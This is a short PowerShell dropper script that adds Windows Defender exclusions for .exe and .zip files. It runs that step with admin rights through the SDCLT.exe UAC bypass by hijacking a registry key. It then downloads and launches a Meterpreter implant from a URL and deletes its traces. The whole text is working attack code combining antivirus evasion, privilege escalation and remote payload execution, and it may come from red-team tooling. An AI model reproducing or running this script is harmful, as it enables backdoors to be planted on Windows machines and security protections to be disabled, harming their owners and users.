# Define local filename and URL to Dropper/Implant
$pl_filename = "Reader_sl.exe"
$pl_Uri = "http://127.0.0.1/Meterpreter.exe"

# Write our Defender-disabling command to a file in $ENV:TEMP
$filename = $env:temp + "\" + "CONTOSO.ps1"
New-Item $filename
$cli = 'Add-MpPreference -ExclusionExtension (".exe", ".zip")'
Set-Content $filename $cli

# Leveraging UAC bypass (SDCLT.exe) to run our above script with Admin priveleges.
$cmd = 'powershell.exe -executionpolicy bypass ' + $filename + ''
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value $cmd
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe

# Sleep for 15 seconds Allow exceptions to register before downloading Stage 2.
Start-Sleep -s 15

# Download our Meterpreter payload and execute.
Invoke-WebRequest -Uri $pl_Uri -OutFile $env:temp\$pl_filename 
Start-Process -FilePath $env:temp\$pl_filename

# Remove our temporary file as well as restore SDCLT functionality.
Remove-Item $filename
Remove-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command"
